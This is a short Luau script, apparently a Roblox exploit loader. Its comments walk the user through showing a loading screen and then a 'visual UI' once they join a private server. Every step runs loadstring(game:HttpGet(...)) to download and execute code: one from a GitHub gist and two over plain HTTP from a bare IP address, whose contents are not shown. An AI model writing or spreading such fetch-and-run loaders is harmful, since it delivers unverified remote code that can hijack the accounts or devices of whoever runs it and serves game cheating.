ID = "32fc6b08-2829-4179-8e59-e807d04c35b1";

-- This will run after your loader finishes joining the private server
RUN_AFTER = function()
    -- Step 1: Run your custom loading screen
    loadstring(game:HttpGet("https://gist.githubusercontent.com/Project-Rev-erse/0a66846f4bdd005f5059ce8d13782084/raw/8f7521de66e1985c8a1a53d62e22a6507e2b96a0/Project%2520Reverse%2520loading%2520ui", true))()

    -- Step 2: Wait 30 seconds (same as your loading screen)
    task.wait(30)

    -- Step 3: Load the visual UI after the loading screen
    loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
end

-- Finally, run the loader (it’ll call RUN_AFTER once you’re in your private server)
loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
